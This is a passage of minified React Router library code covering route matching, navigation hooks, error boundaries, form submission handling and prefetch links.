                    pathname: b.pathname,
                    search: b.search,
                    hash: b.hash
                }
            },
            push: w,
            replace: E,
            go(x) {
                return u.go(x)
            }
        };
        return _
    }
    function G6(t, e=!1) {
        let n = "http://localhost";
        typeof window < "u" && (n = window.location.origin !== "null" ? window.location.origin : window.location.href),
        yt(n, "No window.location.(origin|href) available to create URL");
        let s = typeof t == "string" ? t : tc(t);
        return s = s.replace(/ $/, "%20"),
        !e && s.startsWith("//") && (s = n + s),
        new URL(s,n)
    }
    function cE(t, e, n="/") {
        return q6(t, e, n, !1)
    }
    function q6(t, e, n, s) {
        let o = typeof e == "string" ? ho(e) : e
          , l = rr(o.pathname || "/", n);
        if (l == null)
            return null;
        let u = uE(t);
        F6(u);
        let d = null;
        for (let p = 0; d == null && p < u.length; ++p) {
            let h = tD(l);
            d = W6(u[p], h, s)
        }
        return d
    }
    function uE(t, e=[], n=[], s="") {
        let o = (l, u, d) => {
            let p = {
                relativePath: d === void 0 ? l.path || "" : d,
                caseSensitive: l.caseSensitive === !0,
                childrenIndex: u,
                route: l
            };
            p.relativePath.startsWith("/") && (yt(p.relativePath.startsWith(s), `Absolute route path "${p.relativePath}" nested under path "${s}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),
            p.relativePath = p.relativePath.slice(s.length));
            let h = Wi([s, p.relativePath])
              , m = n.concat(p);
            l.children && l.children.length > 0 && (yt(l.index !== !0, `Index routes must not have child routes. Please remove all child routes from route path "${h}".`),
            uE(l.children, e, m, h)),
            !(l.path == null && !l.index) && e.push({
                path: h,
                score: J6(h, l.index),
                routesMeta: m
            })
        }
        ;
        return t.forEach( (l, u) => {
            if (l.path === "" || !l.path?.includes("?"))
                o(l, u);
            else
                for (let d of dE(l.path))
                    o(l, u, d)
        }
        ),
        e
    }
    function dE(t) {
        let e = t.split("/");
        if (e.length === 0)
            return [];
        let[n,...s] = e
          , o = n.endsWith("?")
          , l = n.replace(/\?$/, "");
        if (s.length === 0)
            return o ? [l, ""] : [l];
        let u = dE(s.join("/"))
          , d = [];
        return d.push(...u.map(p => p === "" ? l : [l, p].join("/"))),
        o && d.push(...u),
        d.map(p => t.startsWith("/") && p === "" ? "/" : p)
    }
    function F6(t) {
        t.sort( (e, n) => e.score !== n.score ? n.score - e.score : $6(e.routesMeta.map(s => s.childrenIndex), n.routesMeta.map(s => s.childrenIndex)))
    }
    var Q6 = /^:[\w-]+$/
      , V6 = 3
      , Y6 = 2
      , Z6 = 1
      , K6 = 10
      , X6 = -2
      , u1 = t => t === "*";
    function J6(t, e) {
        let n = t.split("/")
          , s = n.length;
        return n.some(u1) && (s += X6),
        e && (s += Y6),
        n.filter(o => !u1(o)).reduce( (o, l) => o + (Q6.test(l) ? V6 : l === "" ? Z6 : K6), s)
    }
    function $6(t, e) {
        return t.length === e.length && t.slice(0, -1).every( (s, o) => s === e[o]) ? t[t.length - 1] - e[e.length - 1] : 0
    }
    function W6(t, e, n=!1) {
        let {routesMeta: s} = t
          , o = {}
          , l = "/"
          , u = [];
        for (let d = 0; d < s.length; ++d) {
            let p = s[d]
              , h = d === s.length - 1
              , m = l === "/" ? e : e.slice(l.length) || "/"
              , y = Md({
                path: p.relativePath,
                caseSensitive: p.caseSensitive,
                end: h
            }, m)
              , w = p.route;
            if (!y && h && n && !s[s.length - 1].route.index && (y = Md({
                path: p.relativePath,
                caseSensitive: p.caseSensitive,
                end: !1
            }, m)),
            !y)
                return null;
            Object.assign(o, y.params),
            u.push({
                params: o,
                pathname: Wi([l, y.pathname]),
                pathnameBase: sD(Wi([l, y.pathnameBase])),
                route: w
            }),
            y.pathnameBase !== "/" && (l = Wi([l, y.pathnameBase]))
        }
        return u
    }
    function Md(t, e) {
        typeof t == "string" && (t = {
            path: t,
            caseSensitive: !1,
            end: !0
        });
        let[n,s] = eD(t.path, t.caseSensitive, t.end)
          , o = e.match(n);
        if (!o)
            return null;
        let l = o[0]
          , u = l.replace(/(.)\/+$/, "$1")
          , d = o.slice(1);
        return {
            params: s.reduce( (h, {paramName: m, isOptional: y}, w) => {
                if (m === "*") {
                    let S = d[w] || "";
                    u = l.slice(0, l.length - S.length).replace(/(.)\/+$/, "$1")
                }
                const E = d[w];
                return y && !E ? h[m] = void 0 : h[m] = (E || "").replace(/%2F/g, "/"),
                h
            }
            , {}),
            pathname: l,
            pathnameBase: u,
            pattern: t
        }
    }
    function eD(t, e=!1, n=!0) {
        wi(t === "*" || !t.endsWith("*") || t.endsWith("/*"), `Route path "${t}" will be treated as if it were "${t.replace(/\*$/, "/*")}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${t.replace(/\*$/, "/*")}".`);
        let s = []
          , o = "^" + t.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^${}|()[\]]/g, "\\$&").replace(/\/:([\w-]+)(\?)?/g, (u, d, p) => (s.push({
            paramName: d,
            isOptional: p != null
        }),
        p ? "/?([^\\/]+)?" : "/([^\\/]+)"));
        return t.endsWith("*") ? (s.push({
            paramName: "*"
        }),
        o += t === "*" || t === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? o += "\\/*$" : t !== "" && t !== "/" && (o += "(?:(?=\\/|$))"),
        [new RegExp(o,e ? void 0 : "i"), s]
    }
    function tD(t) {
        try {
            return t.split("/").map(e => decodeURIComponent(e).replace(/\//g, "%2F")).join("/")
        } catch (e) {
            return wi(!1, `The URL path "${t}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${e}).`),
            t
        }
    }
    function rr(t, e) {
        if (e === "/")
            return t;
        if (!t.toLowerCase().startsWith(e.toLowerCase()))
            return null;
        let n = e.endsWith("/") ? e.length - 1 : e.length
          , s = t.charAt(n);
        return s && s !== "/" ? null : t.slice(n) || "/"
    }
    function nD(t, e="/") {
        let {pathname: n, search: s="", hash: o=""} = typeof t == "string" ? ho(t) : t;
        return {
            pathname: n ? n.startsWith("/") ? n : iD(n, e) : e,
            search: aD(s),
            hash: oD(o)
        }
    }
    function iD(t, e) {
        let n = e.replace(/\/+$/, "").split("/");
        return t.split("/").forEach(o => {
            o === ".." ? n.length > 1 && n.pop() : o !== "." && n.push(o)
        }
        ),
        n.length > 1 ? n.join("/") : "/"
    }
    function Jm(t, e, n, s) {
        return `Cannot include a '${t}' character in a manually specified \`to.${e}\` field [${JSON.stringify(s)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`
    }
    function rD(t) {
        return t.filter( (e, n) => n === 0 || e.route.path && e.route.path.length > 0)
    }
    function fE(t) {
        let e = rD(t);
        return e.map( (n, s) => s === e.length - 1 ? n.pathname : n.pathnameBase)
    }
    function hE(t, e, n, s=!1) {
        let o;
        typeof t == "string" ? o = ho(t) : (o = {
            ...t
        },
        yt(!o.pathname || !o.pathname.includes("?"), Jm("?", "pathname", "search", o)),
        yt(!o.pathname || !o.pathname.includes("#"), Jm("#", "pathname", "hash", o)),
        yt(!o.search || !o.search.includes("#"), Jm("#", "search", "hash", o)));
        let l = t === "" || o.pathname === "", u = l ? "/" : o.pathname, d;
        if (u == null)
            d = n;
        else {
            let y = e.length - 1;
            if (!s && u.startsWith("..")) {
                let w = u.split("/");
                for (; w[0] === ".."; )
                    w.shift(),
                    y -= 1;
                o.pathname = w.join("/")
            }
            d = y >= 0 ? e[y] : "/"
        }
        let p = nD(o, d)
          , h = u && u !== "/" && u.endsWith("/")
          , m = (l || u === ".") && n.endsWith("/");
        return !p.pathname.endsWith("/") && (h || m) && (p.pathname += "/"),
        p
    }
    var Wi = t => t.join("/").replace(/\/\/+/g, "/")
      , sD = t => t.replace(/\/+$/, "").replace(/^\/*/, "/")
      , aD = t => !t || t === "?" ? "" : t.startsWith("?") ? t : "?" + t
      , oD = t => !t || t === "#" ? "" : t.startsWith("#") ? t : "#" + t;
    function lD(t) {
        return t != null && typeof t.status == "number" && typeof t.statusText == "string" && typeof t.internal == "boolean" && "data"in t
    }
    var mE = ["POST", "PUT", "PATCH", "DELETE"];
    new Set(mE);
    var cD = ["GET", ...mE];
    new Set(cD);
    var mo = Q.createContext(null);
    mo.displayName = "DataRouter";
    var lf = Q.createContext(null);
    lf.displayName = "DataRouterState";
    var pE = Q.createContext({
        isTransitioning: !1
    });
    pE.displayName = "ViewTransition";
    var uD = Q.createContext(new Map);
    uD.displayName = "Fetchers";
    var dD = Q.createContext(null);
    dD.displayName = "Await";
    var Ei = Q.createContext(null);
    Ei.displayName = "Navigation";
    var dc = Q.createContext(null);
    dc.displayName = "Location";
    var xi = Q.createContext({
        outlet: null,
        matches: [],
        isDataRoute: !1
    });
    xi.displayName = "Route";
    var G0 = Q.createContext(null);
    G0.displayName = "RouteError";
    function fD(t, {relative: e}={}) {
        yt(fc(), "useHref() may be used only in the context of a <Router> component.");
        let {basename: n, navigator: s} = Q.useContext(Ei)
          , {hash: o, pathname: l, search: u} = hc(t, {
            relative: e
        })
          , d = l;
        return n !== "/" && (d = l === "/" ? n : Wi([n, l])),
        s.createHref({
            pathname: d,
            search: u,
            hash: o
        })
    }
    function fc() {
        return Q.useContext(dc) != null
    }
    function Yr() {
        return yt(fc(), "useLocation() may be used only in the context of a <Router> component."),
        Q.useContext(dc).location
    }
    var gE = "You should call navigate() in a React.useEffect(), not when your component is first rendered.";
    function yE(t) {
        Q.useContext(Ei).static || Q.useLayoutEffect(t)
    }
    function q0() {
        let {isDataRoute: t} = Q.useContext(xi);
        return t ? TD() : hD()
    }
    function hD() {
        yt(fc(), "useNavigate() may be used only in the context of a <Router> component.");
        let t = Q.useContext(mo)
          , {basename: e, navigator: n} = Q.useContext(Ei)
          , {matches: s} = Q.useContext(xi)
          , {pathname: o} = Yr()
          , l = JSON.stringify(fE(s))
          , u = Q.useRef(!1);
        return yE( () => {
            u.current = !0
        }
        ),
        Q.useCallback( (p, h={}) => {
            if (wi(u.current, gE),
            !u.current)
                return;
            if (typeof p == "number") {
                n.go(p);
                return
            }
            let m = hE(p, JSON.parse(l), o, h.relative === "path");
            t == null && e !== "/" && (m.pathname = m.pathname === "/" ? e : Wi([e, m.pathname])),
            (h.replace ? n.replace : n.push)(m, h.state, h)
        }
        , [e, n, l, o, t])
    }
    Q.createContext(null);
    function mD() {
        let {matches: t} = Q.useContext(xi)
          , e = t[t.length - 1];
        return e ? e.params : {}
    }
    function hc(t, {relative: e}={}) {
        let {matches: n} = Q.useContext(xi)
          , {pathname: s} = Yr()
          , o = JSON.stringify(fE(n));
        return Q.useMemo( () => hE(t, JSON.parse(o), s, e === "path"), [t, o, s, e])
    }
    function pD(t, e) {
        return vE(t, e)
    }
    function vE(t, e, n, s) {
        yt(fc(), "useRoutes() may be used only in the context of a <Router> component.");
        let {navigator: o} = Q.useContext(Ei)
          , {matches: l} = Q.useContext(xi)
          , u = l[l.length - 1]
          , d = u ? u.params : {}
          , p = u ? u.pathname : "/"
          , h = u ? u.pathnameBase : "/"
          , m = u && u.route;
        {
            let b = m && m.path || "";
            bE(p, !m || b.endsWith("*") || b.endsWith("*?"), `You rendered descendant <Routes> (or called \`useRoutes()\`) at "${p}" (under <Route path="${b}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${b}"> to <Route path="${b === "/" ? "*" : `${b}/*`}">.`)
        }
        let y = Yr(), w;
        if (e) {
            let b = typeof e == "string" ? ho(e) : e;
            yt(h === "/" || b.pathname?.startsWith(h), `When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${h}" but pathname "${b.pathname}" was given in the \`location\` prop.`),
            w = b
        } else
            w = y;
        let E = w.pathname || "/"
          , S = E;
        if (h !== "/") {
            let b = h.replace(/^\//, "").split("/");
            S = "/" + E.replace(/^\//, "").split("/").slice(b.length).join("/")
        }
        let _ = cE(t, {
            pathname: S
        });
        wi(m || _ != null, `No routes matched location "${w.pathname}${w.search}${w.hash}" `),
        wi(_ == null || _[_.length - 1].route.element !== void 0 || _[_.length - 1].route.Component !== void 0 || _[_.length - 1].route.lazy !== void 0, `Matched leaf route at location "${w.pathname}${w.search}${w.hash}" does not have an element or Component. This means it will render an <Outlet /> with a null value by default resulting in an "empty" page.`);
        let x = AD(_ && _.map(b => Object.assign({}, b, {
            params: Object.assign({}, d, b.params),
            pathname: Wi([h, o.encodeLocation ? o.encodeLocation(b.pathname).pathname : b.pathname]),
            pathnameBase: b.pathnameBase === "/" ? h : Wi([h, o.encodeLocation ? o.encodeLocation(b.pathnameBase).pathname : b.pathnameBase])
        })), l, n, s);
        return e && x ? Q.createElement(dc.Provider, {
            value: {
                location: {
                    pathname: "/",
                    search: "",
                    hash: "",
                    state: null,
                    key: "default",
                    ...w
                },
                navigationType: "POP"
            }
        }, x) : x
    }
    function gD() {
        let t = SD()
          , e = lD(t) ? `${t.status} ${t.statusText}` : t instanceof Error ? t.message : JSON.stringify(t)
          , n = t instanceof Error ? t.stack : null
          , s = "rgba(200,200,200, 0.5)"
          , o = {
            padding: "0.5rem",
            backgroundColor: s
        }
          , l = {
            padding: "2px 4px",
            backgroundColor: s
        }
          , u = null;
        return console.error("Error handled by React Router default ErrorBoundary:", t),
        u = Q.createElement(Q.Fragment, null, Q.createElement("p", null, "💿 Hey developer 👋"), Q.createElement("p", null, "You can provide a way better UX than this when your app throws errors by providing your own ", Q.createElement("code", {
            style: l
        }, "ErrorBoundary"), " or", " ", Q.createElement("code", {
            style: l
        }, "errorElement"), " prop on your route.")),
        Q.createElement(Q.Fragment, null, Q.createElement("h2", null, "Unexpected Application Error!"), Q.createElement("h3", {
            style: {
                fontStyle: "italic"
            }
        }, e), n ? Q.createElement("pre", {
            style: o
        }, n) : null, u)
    }
    var yD = Q.createElement(gD, null)
      , vD = class extends Q.Component {
        constructor(t) {
            super(t),
            this.state = {
                location: t.location,
                revalidation: t.revalidation,
                error: t.error
            }
        }
        static getDerivedStateFromError(t) {
            return {
                error: t
            }
        }
        static getDerivedStateFromProps(t, e) {
            return e.location !== t.location || e.revalidation !== "idle" && t.revalidation === "idle" ? {
                error: t.error,
                location: t.location,
                revalidation: t.revalidation
            } : {
                error: t.error !== void 0 ? t.error : e.error,
                location: e.location,
                revalidation: t.revalidation || e.revalidation
            }
        }
        componentDidCatch(t, e) {
            console.error("React Router caught the following error during render", t, e)
        }
        render() {
            return this.state.error !== void 0 ? Q.createElement(xi.Provider, {
                value: this.props.routeContext
            }, Q.createElement(G0.Provider, {
                value: this.state.error,
                children: this.props.component
            })) : this.props.children
        }
    }
    ;
    function bD({routeContext: t, match: e, children: n}) {
        let s = Q.useContext(mo);
        return s && s.static && s.staticContext && (e.route.errorElement || e.route.ErrorBoundary) && (s.staticContext._deepestRenderedBoundaryId = e.route.id),
        Q.createElement(xi.Provider, {
            value: t
        }, n)
    }
    function AD(t, e=[], n=null, s=null) {
        if (t == null) {
            if (!n)
                return null;
            if (n.errors)
                t = n.matches;
            else if (e.length === 0 && !n.initialized && n.matches.length > 0)
                t = n.matches;
            else
                return null
        }
        let o = t
          , l = n?.errors;
        if (l != null) {
            let p = o.findIndex(h => h.route.id && l?.[h.route.id] !== void 0);
            yt(p >= 0, `Could not find a matching route for errors on route IDs: ${Object.keys(l).join(",")}`),
            o = o.slice(0, Math.min(o.length, p + 1))
        }
        let u = !1
          , d = -1;
        if (n)
            for (let p = 0; p < o.length; p++) {
                let h = o[p];
                if ((h.route.HydrateFallback || h.route.hydrateFallbackElement) && (d = p),
                h.route.id) {
                    let {loaderData: m, errors: y} = n
                      , w = h.route.loader && !m.hasOwnProperty(h.route.id) && (!y || y[h.route.id] === void 0);
                    if (h.route.lazy || w) {
                        u = !0,
                        d >= 0 ? o = o.slice(0, d + 1) : o = [o[0]];
                        break
                    }
                }
            }
        return o.reduceRight( (p, h, m) => {
            let y, w = !1, E = null, S = null;
            n && (y = l && h.route.id ? l[h.route.id] : void 0,
            E = h.route.errorElement || yD,
            u && (d < 0 && m === 0 ? (bE("route-fallback", !1, "No `HydrateFallback` element provided to render during initial hydration"),
            w = !0,
            S = null) : d === m && (w = !0,
            S = h.route.hydrateFallbackElement || null)));
            let _ = e.concat(o.slice(0, m + 1))
              , x = () => {
                let b;
                return y ? b = E : w ? b = S : h.route.Component ? b = Q.createElement(h.route.Component, null) : h.route.element ? b = h.route.element : b = p,
                Q.createElement(bD, {
                    match: h,
                    routeContext: {
                        outlet: p,
                        matches: _,
                        isDataRoute: n != null
                    },
                    children: b
                })
            }
            ;
            return n && (h.route.ErrorBoundary || h.route.errorElement || m === 0) ? Q.createElement(vD, {
                location: n.location,
                revalidation: n.revalidation,
                component: E,
                error: y,
                children: x(),
                routeContext: {
                    outlet: null,
                    matches: _,
                    isDataRoute: !0
                }
            }) : x()
        }
        , null)
    }
    function F0(t) {
        return `${t} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`
    }
    function wD(t) {
        let e = Q.useContext(mo);
        return yt(e, F0(t)),
        e
    }
    function _D(t) {
        let e = Q.useContext(lf);
        return yt(e, F0(t)),
        e
    }
    function ED(t) {
        let e = Q.useContext(xi);
        return yt(e, F0(t)),
        e
    }
    function Q0(t) {
        let e = ED(t)
          , n = e.matches[e.matches.length - 1];
        return yt(n.route.id, `${t} can only be used on routes that contain a unique "id"`),
        n.route.id
    }
    function xD() {
        return Q0("useRouteId")
    }
    function SD() {
        let t = Q.useContext(G0)
          , e = _D("useRouteError")
          , n = Q0("useRouteError");
        return t !== void 0 ? t : e.errors?.[n]
    }
    function TD() {
        let {router: t} = wD("useNavigate")
          , e = Q0("useNavigate")
          , n = Q.useRef(!1);
        return yE( () => {
            n.current = !0
        }
        ),
        Q.useCallback(async (o, l={}) => {
            wi(n.current, gE),
            n.current && (typeof o == "number" ? t.navigate(o) : await t.navigate(o, {
                fromRouteId: e,
                ...l
            }))
        }
        , [t, e])
    }
    var d1 = {};
    function bE(t, e, n) {
        !e && !d1[t] && (d1[t] = !0,
        wi(!1, n))
    }
    Q.memo(RD);
    function RD({routes: t, future: e, state: n}) {
        return vE(t, void 0, n, e)
    }
    function Lp(t) {
        yt(!1, "A <Route> is only ever to be used as the child of <Routes> element, never rendered directly. Please wrap your <Route> in a <Routes>.")
    }
    function BD({basename: t="/", children: e=null, location: n, navigationType: s="POP", navigator: o, static: l=!1}) {
        yt(!fc(), "You cannot render a <Router> inside another <Router>. You should never have more than one in your app.");
        let u = t.replace(/^\/*/, "/")
          , d = Q.useMemo( () => ({
            basename: u,
            navigator: o,
            static: l,
            future: {}
        }), [u, o, l]);
        typeof n == "string" && (n = ho(n));
        let {pathname: p="/", search: h="", hash: m="", state: y=null, key: w="default"} = n
          , E = Q.useMemo( () => {
            let S = rr(p, u);
            return S == null ? null : {
                location: {
                    pathname: S,
                    search: h,
                    hash: m,
                    state: y,
                    key: w
                },
                navigationType: s
            }
        }
        , [u, p, h, m, y, w, s]);
        return wi(E != null, `<Router basename="${u}"> is not able to match the URL "${p}${h}${m}" because it does not start with the basename, so the <Router> won't render anything.`),
        E == null ? null : Q.createElement(Ei.Provider, {
            value: d
        }, Q.createElement(dc.Provider, {
            children: e,
            value: E
        }))
    }
    function CD({children: t, location: e}) {
        return pD(Up(t), e)
    }
    function Up(t, e=[]) {
        let n = [];
        return Q.Children.forEach(t, (s, o) => {
            if (!Q.isValidElement(s))
                return;
            let l = [...e, o];
            if (s.type === Q.Fragment) {
                n.push.apply(n, Up(s.props.children, l));
                return
            }
            yt(s.type === Lp, `[${typeof s.type == "string" ? s.type : s.type.name}] is not a <Route> component. All component children of <Routes> must be a <Route> or <React.Fragment>`),
            yt(!s.props.index || !s.props.children, "An index route cannot have child routes.");
            let u = {
                id: s.props.id || l.join("-"),
                caseSensitive: s.props.caseSensitive,
                element: s.props.element,
                Component: s.props.Component,
                index: s.props.index,
                path: s.props.path,
                loader: s.props.loader,
                action: s.props.action,
                hydrateFallbackElement: s.props.hydrateFallbackElement,
                HydrateFallback: s.props.HydrateFallback,
                errorElement: s.props.errorElement,
                ErrorBoundary: s.props.ErrorBoundary,
                hasErrorBoundary: s.props.hasErrorBoundary === !0 || s.props.ErrorBoundary != null || s.props.errorElement != null,
                shouldRevalidate: s.props.shouldRevalidate,
                handle: s.props.handle,
                lazy: s.props.lazy
            };
            s.props.children && (u.children = Up(s.props.children, l)),
            n.push(u)
        }
        ),
        n
    }
    var Pu = "get"
      , Hu = "application/x-www-form-urlencoded";
    function cf(t) {
        return t != null && typeof t.tagName == "string"
    }
    function ID(t) {
        return cf(t) && t.tagName.toLowerCase() === "button"
    }
    function kD(t) {
        return cf(t) && t.tagName.toLowerCase() === "form"
    }
    function OD(t) {
        return cf(t) && t.tagName.toLowerCase() === "input"
    }
    function ND(t) {
        return !!(t.metaKey || t.altKey || t.ctrlKey || t.shiftKey)
    }
    function MD(t, e) {
        return t.button === 0 && (!e || e === "_self") && !ND(t)
    }
    var Cu = null;
    function DD() {
        if (Cu === null)
            try {
                new FormData(document.createElement("form"),0),
                Cu = !1
            } catch {
                Cu = !0
            }
        return Cu
    }
    var LD = new Set(["application/x-www-form-urlencoded", "multipart/form-data", "text/plain"]);
    function $m(t) {
        return t != null && !LD.has(t) ? (wi(!1, `"${t}" is not a valid \`encType\` for \`<Form>\`/\`<fetcher.Form>\` and will default to "${Hu}"`),
        null) : t
    }
    function UD(t, e) {
        let n, s, o, l, u;
        if (kD(t)) {
            let d = t.getAttribute("action");
            s = d ? rr(d, e) : null,
            n = t.getAttribute("method") || Pu,
            o = $m(t.getAttribute("enctype")) || Hu,
            l = new FormData(t)
        } else if (ID(t) || OD(t) && (t.type === "submit" || t.type === "image")) {
            let d = t.form;
            if (d == null)
                throw new Error('Cannot submit a <button> or <input type="submit"> without a <form>');
            let p = t.getAttribute("formaction") || d.getAttribute("action");
            if (s = p ? rr(p, e) : null,
            n = t.getAttribute("formmethod") || d.getAttribute("method") || Pu,
            o = $m(t.getAttribute("formenctype")) || $m(d.getAttribute("enctype")) || Hu,
            l = new FormData(d,t),
            !DD()) {
                let {name: h, type: m, value: y} = t;
                if (m === "image") {
                    let w = h ? `${h}.` : "";
                    l.append(`${w}x`, "0"),
                    l.append(`${w}y`, "0")
                } else
                    h && l.append(h, y)
            }
        } else {
            if (cf(t))
                throw new Error('Cannot submit element that is not <form>, <button>, or <input type="submit|image">');
            n = Pu,
            s = null,
            o = Hu,
            u = t
        }
        return l && o === "text/plain" && (u = l,
        l = void 0),
        {
            action: s,
            method: n.toLowerCase(),
            encType: o,
            formData: l,
            body: u
        }
    }
    function V0(t, e) {
        if (t === !1 || t === null || typeof t > "u")
            throw new Error(e)
    }
    async function jD(t, e) {
        if (t.id in e)
            return e[t.id];
        try {
            let n = await import(t.module);
            return e[t.id] = n,
            n
        } catch (n) {
            return console.error(`Error loading route module \`${t.module}\`, reloading page...`),
            console.error(n),
            window.__reactRouterContext && window.__reactRouterContext.isSpaMode,
            window.location.reload(),
            new Promise( () => {}
            )
        }
    }
    function PD(t) {
        return t == null ? !1 : t.href == null ? t.rel === "preload" && typeof t.imageSrcSet == "string" && typeof t.imageSizes == "string" : typeof t.rel == "string" && typeof t.href == "string"
    }
    async function HD(t, e, n) {
        let s = await Promise.all(t.map(async o => {
            let l = e.routes[o.route.id];
            if (l) {
                let u = await jD(l, n);
                return u.links ? u.links() : []
            }
            return []
        }
        ));
        return FD(s.flat(1).filter(PD).filter(o => o.rel === "stylesheet" || o.rel === "preload").map(o => o.rel === "stylesheet" ? {
            ...o,
            rel: "prefetch",
            as: "style"
        } : {
            ...o,
            rel: "prefetch"
        }))
    }
    function f1(t, e, n, s, o, l) {
        let u = (p, h) => n[h] ? p.route.id !== n[h].route.id : !0
          , d = (p, h) => n[h].pathname !== p.pathname || n[h].route.path?.endsWith("*") && n[h].params["*"] !== p.params["*"];
        return l === "assets" ? e.filter( (p, h) => u(p, h) || d(p, h)) : l === "data" ? e.filter( (p, h) => {
            let m = s.routes[p.route.id];
            if (!m || !m.hasLoader)
                return !1;
            if (u(p, h) || d(p, h))
                return !0;
            if (p.route.shouldRevalidate) {
                let y = p.route.shouldRevalidate({
                    currentUrl: new URL(o.pathname + o.search + o.hash,window.origin),
                    currentParams: n[0]?.params || {},
                    nextUrl: new URL(t,window.origin),
                    nextParams: p.params,
                    defaultShouldRevalidate: !0
                });
                if (typeof y == "boolean")
                    return y
            }
            return !0
        }
        ) : []
    }
    function zD(t, e, {includeHydrateFallback: n}={}) {
        return GD(t.map(s => {
            let o = e.routes[s.route.id];
            if (!o)
                return [];
            let l = [o.module];
            return o.clientActionModule && (l = l.concat(o.clientActionModule)),
            o.clientLoaderModule && (l = l.concat(o.clientLoaderModule)),
            n && o.hydrateFallbackModule && (l = l.concat(o.hydrateFallbackModule)),
            o.imports && (l = l.concat(o.imports)),
            l
        }
        ).flat(1))
    }
    function GD(t) {
        return [...new Set(t)]
    }
    function qD(t) {
        let e = {}
          , n = Object.keys(t).sort();
        for (let s of n)
            e[s] = t[s];
        return e
    }
    function FD(t, e) {
        let n = new Set;
        return new Set(e),
        t.reduce( (s, o) => {
            let l = JSON.stringify(qD(o));
            return n.has(l) || (n.add(l),
            s.push({
                key: l,
                link: o
            })),
            s
        }
        , [])
    }
    Object.getOwnPropertyNames(Object.prototype).sort().join("\0");
    var QD = new Set([100, 101, 204, 205]);
    function VD(t, e) {
        let n = typeof t == "string" ? new URL(t,typeof window > "u" ? "server://singlefetch/" : window.location.origin) : t;
        return n.pathname === "/" ? n.pathname = "_root.data" : e && rr(n.pathname, e) === "/" ? n.pathname = `${e.replace(/\/$/, "")}/_root.data` : n.pathname = `${n.pathname.replace(/\/$/, "")}.data`,
        n
    }
    function AE() {
        let t = Q.useContext(mo);
        return V0(t, "You must render this element inside a <DataRouterContext.Provider> element"),
        t
    }
    function YD() {
        let t = Q.useContext(lf);
        return V0(t, "You must render this element inside a <DataRouterStateContext.Provider> element"),
        t
    }
    var Y0 = Q.createContext(void 0);
    Y0.displayName = "FrameworkContext";
    function wE() {
        let t = Q.useContext(Y0);
        return V0(t, "You must render this element inside a <HydratedRouter> element"),
        t
    }
    function ZD(t, e) {
        let n = Q.useContext(Y0)
          , [s,o] = Q.useState(!1)
          , [l,u] = Q.useState(!1)
          , {onFocus: d, onBlur: p, onMouseEnter: h, onMouseLeave: m, onTouchStart: y} = e
          , w = Q.useRef(null);
        Q.useEffect( () => {
            if (t === "render" && u(!0),
            t === "viewport") {
                let _ = b => {
                    b.forEach(I => {
                        u(I.isIntersecting)
                    }
                    )
                }
                  , x = new IntersectionObserver(_,{
                    threshold: .5
                });
                return w.current && x.observe(w.current),
                () => {
                    x.disconnect()
                }
            }
        }
        , [t]),
        Q.useEffect( () => {
            if (s) {
                let _ = setTimeout( () => {
                    u(!0)
                }
                , 100);
                return () => {
                    clearTimeout(_)
                }
            }
        }
        , [s]);
        let E = () => {
            o(!0)
        }
          , S = () => {
            o(!1),
            u(!1)
        }
        ;
        return n ? t !== "intent" ? [l, w, {}] : [l, w, {
            onFocus: Al(d, E),
            onBlur: Al(p, S),
            onMouseEnter: Al(h, E),
            onMouseLeave: Al(m, S),
            onTouchStart: Al(y, E)
        }] : [!1, w, {}]
    }
    function Al(t, e) {
        return n => {
            t && t(n),
            n.defaultPrevented || e(n)
        }
    }
    function KD({page: t, ...e}) {
        let {router: n} = AE()
          , s = Q.useMemo( () => cE(n.routes, t, n.basename), [n.routes, t, n.basename]);
        return s ? Q.createElement(JD, {
            page: t,
            matches: s,
            ...e
        }) : null
    }
    function XD(t) {
        let {manifest: e, routeModules: n} = wE()
          , [s,o] = Q.useState([]);
        return Q.useEffect( () => {
            let l = !1;
            return HD(t, e, n).then(u => {
                l || o(u)
            }
            ),
            () => {
                l = !0
            }
        }
        , [t, e, n]),
        s
    }
    function JD({page: t, matches: e, ...n}) {
        let s = Yr()
          , {manifest: o, routeModules: l} = wE()
          , {basename: u} = AE()
          , {loaderData: d, matches: p} = YD()
          , h = Q.useMemo( () => f1(t, e, p, o, s, "data"), [t, e, p, o, s])
          , m = Q.useMemo( () => f1(t, e, p, o, s, "assets"), [t, e, p, o, s])
          , y = Q.useMemo( () => {
            if (t === s.pathname + s.search + s.hash)
                return [];
            let S = new Set
              , _ = !1;
            if (e.forEach(b => {
                let I = o.routes[b.route.id];
                !I || !I.hasLoader || (!h.some(O => O.route.id === b.route.id) && b.route.id in d && l[b.route.id]?.shouldRevalidate || I.hasClientLoader ? _ = !0 : S.add(b.route.id))
            }
            ),
            S.size === 0)
                return [];
            let x = VD(t, u);
            return _ && S.size > 0 && x.searchParams.set("_routes", e.filter(b => S.has(b.route.id)).map(b => b.route.id).join(",")),
            [x.pathname + x.search]
        }
        , [u, d, s, o, h, e, t, l])
          , w = Q.useMemo( () => zD(m, o), [m, o])
          , E = XD(m);
        return Q.createElement(Q.Fragment, null, y.map(S => Q.createElement("link", {
            key: S,
            rel: "prefetch",
            as: "fetch",
            href: S,
            ...n
        })), w.map(S => Q.createElement("link", {
            key: S,
            rel: "modulepreload",
            href: S,
            ...n
        })), E.map( ({key: S, link: _}) => Q.createElement("link", {
            key: S,
            ..._
        })))
    }
    function $D(...t) {
        return e => {
            t.forEach(n => {
                typeof n == "function" ? n(e) : n != null && (n.current = e)
            }
            )
        }
    }
    var _E = typeof window < "u" && typeof window.document < "u" && typeof window.document.createElement < "u";
    try {
        _E && (window.__reactRouterVersion = "7.6.3")
    } catch {}
    function WD({basename: t, children: e, window: n}) {
        let s = Q.useRef();
        s.current == null && (s.current = P6({
            window: n,
            v5Compat: !0
        }));
        let o = s.current
          , [l,u] = Q.useState({
            action: o.action,
            location: o.location
        })
